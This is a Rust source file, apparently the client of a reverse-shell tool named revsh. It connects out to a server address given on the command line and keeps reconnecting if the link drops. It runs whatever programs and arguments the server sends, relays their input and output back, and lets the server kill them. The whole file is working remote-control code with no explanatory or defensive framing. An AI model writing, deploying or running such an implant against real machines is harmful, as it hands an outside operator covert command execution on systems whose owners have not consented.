use anyhow::anyhow;
use serde::{Deserialize, Serialize};
use std::mem::size_of;
use futures::future::OptionFuture;
use std::net::SocketAddr;
use std::sync::{Arc, Mutex, RwLock};
use std::io::{self, BufRead, Write, Read};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpSocket};
use std::collections::HashMap;
use tokio::process;
use std::process::{ ExitStatus, Stdio };
use std::os::unix::process::ExitStatusExt;
use tokio::sync::{ watch, mpsc, broadcast };

use revsh_common::*;

#[derive(Debug, Clone)]
enum InProcessEvent {
    Exited {
        status_code: ExitStatus,
    },
    Printed {
        data: Box<[u8]>,
    },
}

#[derive(Debug, Clone)]
enum OutProcessEvent {
    Kill,
    SendInput {
        data: Box<[u8]>,
    },
}

#[derive(Debug, Clone)]
struct GlobalEvent {
    sender: UID,
    event: InProcessEvent,
}

struct RunningProcess {
    pid: UID,
    event_sender: mpsc::Sender<OutProcessEvent>,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let bjr = std::env::args().nth(1).expect("Missing argument");
    println!("Connecting to {bjr:?}...");

    let address: SocketAddr = bjr.parse().unwrap();

    let mut socket;
    let mut reader;
    let mut writer;

    loop {
        socket = TcpSocket::new_v4().unwrap();
        let stream = match socket.connect(address.clone()).await {
            Ok(s) => s,
            Err(..) => {
                println!("Failed (wait 5s)");
                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                println!("Retrying to connect...");
                continue
            },
        };
        println!("Successfully reconnected to {:?}!", address);

        (reader, writer) = stream.into_split();
        break;
    }

    let processes = Arc::new(RwLock::new(HashMap::<UID, RunningProcess>::new()));
    let (global_sender, mut global_receiver) = broadcast::channel::<GlobalEvent>(100);

    loop {
        tokio::select! {
            message = recv_message_from(&mut reader) => {
                let mess = match message {
                    Err(e) if e.kind() == io::ErrorKind::UnexpectedEof => {
                        println!("Disonnected from server");
                        
                        loop {
                            println!("Trying to reconnect...");
                            socket = TcpSocket::new_v4().unwrap();
                            let stream = match socket.connect(address.clone()).await {
                                Ok(s) => s,
                                Err(..) => {
                                    println!("Failed (wait 2s)");
                                    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                                    continue
                                },
                            };
                            println!("Successfully reconnected to {:?}!", address);
    
                            (reader, writer) = stream.into_split();
                            break;
                        }
                        
                        continue;
                    },
                    a => a.unwrap(),
                };
                match mess {
                    S2CMessage::Execute {
                        pid, exe, args, print_output, client_only
                    } => {
                        let (out_send, out_recv) = mpsc::channel(100);
                        processes.write().unwrap().insert(pid, RunningProcess {
                            pid,
                            event_sender: out_send,
                        });

                        tokio::spawn(
                            handle_process(
                                pid, exe, args, print_output, client_only,
                                Arc::clone(&processes), global_sender.clone(),
                                out_recv,
                            )
                        );
                    }
                    S2CMessage::KillProcess { pid } => {
                        let Some(sender) = processes.read().unwrap()
                            .get(&pid).map(|a| a.event_sender.clone()) 
                        else { continue; };
                        
                        sender.send(OutProcessEvent::Kill).await.unwrap();
                    },
                    S2CMessage::Input { target_pid, data } => {
                        let Some(sender) = processes.read().unwrap()
                            .get(&target_pid).map(|a| a.event_sender.clone()) 
                        else { continue; };
                        
                        sender.send(OutProcessEvent::SendInput {
                            data
                        }).await.unwrap();
                    },
                }
            },
            event = global_receiver.recv() => {
                let GlobalEvent { sender: pid, event }= event.unwrap();
                match event {
                    InProcessEvent::Exited { status_code } => {
                        send_message_into(
                            &C2SMessage::ProcessStopped {
                                pid,
                                exit_code: status_code.code().unwrap_or(0),
                            },
                            &mut writer
                        ).await.unwrap();
                    },
                    InProcessEvent::Printed { data } => {
                        send_message_into(
                            &C2SMessage::ProcessOutput {
                                pid, data
                            },
                            &mut writer
                        ).await.unwrap();
                    }
                }
            }
        }
    }
}

async fn handle_process(
    pid: UID, exe: String, args: Vec<String>,
    print_output: bool, client_only: bool,
    processes: Arc<RwLock<HashMap<UID, RunningProcess>>>,
    global_sender: broadcast::Sender<GlobalEvent>,
    mut out_recv: mpsc::Receiver<OutProcessEvent>,
) -> anyhow::Result<()> {
    let mut child = if client_only {
        process::Command::new(exe)
            .args(args)
            .spawn()?
    } else {
        process::Command::new(exe)
            .args(args)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?
    };
    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();
    let mut stdin  = child.stdin.take();
    
    let mut read_buf = [0u8; 2048];
    let mut err_buf = [0u8; 2048];
    
    loop {
        tokio::select! {
            exit_code = child.wait() => {
                processes.write().unwrap().remove(&pid);
                global_sender.send(GlobalEvent {
                    sender: pid,
                    event: InProcessEvent::Exited {
                        status_code: exit_code.unwrap(),
                    },
                }).unwrap();
                break Ok(());
            },
            Some(out) = out_recv.recv() => {
                match out {
                    OutProcessEvent::Kill => {
                        child.kill().await.expect("No kill");
                        processes.write().unwrap().remove(&pid);
                        global_sender.send(GlobalEvent {
                            sender: pid,
                            event: InProcessEvent::Exited {
                                status_code: ExitStatus::from_raw(0),
                            }
                        }).unwrap();
                    }
                    OutProcessEvent::SendInput { data } => {
                        if let Some(stdin) = &mut stdin {
                            stdin.write_all(&data).await.unwrap();
                        }
                    }
                }
            },
            e = OptionFuture::from(stdout.as_mut().map(|a| a.read(&mut read_buf))), if stdout.is_some() => {
                let length = e.unwrap().unwrap();
                if length == 0 {
                    continue;
                }
                
                if print_output {
                    let mut out = std::io::stdout().lock();
                    out.write_all(&read_buf[..length]).unwrap();
                    out.flush().unwrap();
                }
                
                global_sender.send(GlobalEvent {
                    sender: pid,
                    event: InProcessEvent::Printed {
                        data: read_buf[0..length].into(),
                    },
                }).unwrap();
            }
            e = OptionFuture::from(stderr.as_mut().map(|a| a.read(&mut err_buf))), if stderr.is_some() => {
                let length = e.unwrap().unwrap();
                if length == 0 {
                    continue;
                }

                if print_output {
                    let mut out = std::io::stderr().lock();
                    out.write_all(&err_buf[..length]).unwrap();
                    out.flush().unwrap();
                }
                
                global_sender.send(GlobalEvent {
                    sender: pid,
                    event: InProcessEvent::Printed {
                        data: err_buf[0..length].into(),
                    },
                }).unwrap();
            }
        }
    }
}
